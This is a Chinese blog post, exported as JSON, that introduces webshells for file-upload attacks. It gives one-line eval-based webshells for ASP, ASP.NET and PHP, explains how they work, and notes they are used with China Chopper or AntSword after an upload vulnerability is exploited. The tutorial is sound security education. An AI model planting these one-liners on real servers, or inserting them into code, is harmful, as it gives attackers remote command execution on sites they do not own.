{"title":"文件上传-Webshell介绍","uid":"ac44a9ac4337ea71f1fa38abe9d1c638","slug":"文件上传-Webshell介绍","date":"2022-02-13T12:48:38.000Z","updated":"2022-02-13T14:55:04.207Z","comments":true,"path":"api/articles/文件上传-Webshell介绍.json","keywords":null,"cover":null,"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>[TOC]</p>\n<h2 id=\"Webshell\"><a href=\"#Webshell\" class=\"headerlink\" title=\"Webshell\"></a>Webshell</h2><p>​        webshell就是以<code>asp、php、jsp</code>或者<code>cgi</code>等<code>网页文件形式</code>存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。</p>\n<p>​    在计算机科学中，Shell俗称壳（用来区别于“核”)，是指”为使用者提供操作界面”的软件（命令解释器)。类似于windows系统给的cmd.exe或者linux 下bash 等，虽然这些系统上的命令解释器不止一种。</p>\n<p>webShell是一个网站的后门，也是一个命令解释器，不过是以web方式(HTTP协议）通信（传递命令消息)，继承了web用户的权限。webShell本质上是在服务器端可运行的脚本文件，后缀名为<code>. php/.asp/.aspx/.jsp</code>等，也就是说webShell接收来自于web 用户的命令，然后再服务器端执行。</p>\n<p><strong>说白了，就是获得了网站操作权限。</strong></p>\n<h2 id=\"Webshell分类\"><a href=\"#Webshell分类\" class=\"headerlink\" title=\"Webshell分类\"></a>Webshell分类</h2><h3 id=\"大马\"><a href=\"#大马\" class=\"headerlink\" title=\"大马\"></a>大马</h3><p>webShell 也可以是大马，也是网站木马。有一类webShell之所以叫大马，是因为与小马(一句话木马)区分开，并且代码比较大，但是功能比较丰富。同样，大马有很多种脚本格式，其功能基本相同。每个团队都有自己的定制大马。</p>\n<p>在大马中我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。这是asp 的大马。</p>\n<h3 id=\"小马\"><a href=\"#小马\" class=\"headerlink\" title=\"小马\"></a>小马</h3><p>小马就是一句话木马，因为其代码量比较小，就是一句简单的代码。</p>\n<p>各个脚本的一句话：</p>\n<p>ASP:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;%eval- request(“cmd”&quot;)%&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>ASP.NET:</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;%@ Page Language&#x3D;&quot;“Jscript”%&gt;\n&lt;%eval(Request.Item [“cmd”],“unsafe”&quot; ) ;%&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p>PHP：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php @eval($_REQUEST [ &#39; cmd &#39; ] );?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>一句话木马短小精悍，功能强大，但是需要配合中国菜刀或者中国蚁剑客户端使用，中国菜刀是一句话木马的管理器，也是命令操作接口。</p>\n<p>原文链接：<a href=\"https://blog.csdn.net/Marsper/article/details/109455320\">https://blog.csdn.net/Marsper/article/details/109455320</a></p>\n<h2 id=\"Webshell原理\"><a href=\"#Webshell原理\" class=\"headerlink\" title=\"Webshell原理\"></a>Webshell原理</h2><p>  例如：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><strong>基本原理：</strong></p>\n<p>利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过中国菜刀<code>chopper.exe</code>即可获取和控制整个网站目录。@表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;cmd&#39;]</code>表示从页面中获得<code>cmd</code>这个参数值。</p>\n<p><strong>解析一句话木马：</strong></p>\n<p>（1）php的代码要写在<code>&lt;?php ?&gt;</code>里面，服务器才能认出来这是php代码，然后才去解析。<br>（2）<code>@</code>符号的意思是不报错，即使执行错误，也不报错。</p>\n<p>（3）<code>cmd</code>就是密码</p>\n<p>（4）<code>eval()</code>函数：<strong>eval()把字符串作为PHP代码执行</strong>。post方式接收到变量cmd，此时，变量cmd中的字符串被当作php代码来执行。</p>\n<p>可以参考一下这篇文章，讲得很细：</p>\n<p>原文链接：<a href=\"https://blog.csdn.net/weixin_39190897/article/details/86772765\">https://blog.csdn.net/weixin_39190897/article/details/86772765</a></p>\n","text":"[TOC] Webshell​ webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"文件上传","slug":"文件上传","count":5,"path":"api/categories/文件上传.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Webshell\"><span class=\"toc-text\">Webshell</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Webshell%E5%88%86%E7%B1%BB\"><span class=\"toc-text\">Webshell分类</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%A4%A7%E9%A9%AC\"><span class=\"toc-text\">大马</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E9%A9%AC\"><span class=\"toc-text\">小马</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Webshell%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">Webshell原理</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"文件上传-upload-labs","uid":"839a0bf2eef6223788002c9f68db568c","slug":"文件上传-upload-labs","date":"2022-02-14T06:12:41.000Z","updated":"2023-01-31T13:41:40.159Z","comments":true,"path":"api/articles/文件上传-upload-labs.json","keywords":null,"cover":[],"text":"Pass-01（前端JS绕过）0x00首先分析一下源码： $_FILES：PHP中的$_FILES 是一个预定义的数组，用来获取通过 POST 方法上传文件的相关信息。如果为单个文件上传，那么 $_FILES 为二维数组；如果为多个文件上传，那么 $_FILES 为三维数组。 m...","link":"","photos":[],"count_time":{"symbolsCount":"8.2k","symbolsTime":"7 mins."},"categories":[{"name":"文件上传","slug":"文件上传","count":5,"path":"api/categories/文件上传.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"},{"name":"靶场","slug":"靶场","count":12,"path":"api/tags/靶场.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"文件上传基础","uid":"d7d77bc82bafbf7e1e25394ce17aed92","slug":"文件上传基础","date":"2022-02-12T15:02:42.000Z","updated":"2022-02-13T16:20:08.511Z","comments":true,"path":"api/articles/文件上传基础.json","keywords":null,"cover":[],"text":"[TOC] 前言相比于SQL注入等其他漏洞，文件上传漏洞风险更大，最直接的情况则是上传一个webshell拿权限。 文件上传分类： 了解到是文件上传漏洞时，要清楚是什么类型的文件上传漏洞，之后进行下一步操作。 ##文件上传漏洞原理： 网站Web应用都有一些文件上传功能，比如文档、...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"文件上传","slug":"文件上传","count":5,"path":"api/categories/文件上传.json"}],"tags":[{"name":"文件上传","slug":"文件上传","count":7,"path":"api/tags/文件上传.json"},{"name":"基础知识","slug":"基础知识","count":12,"path":"api/tags/基础知识.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}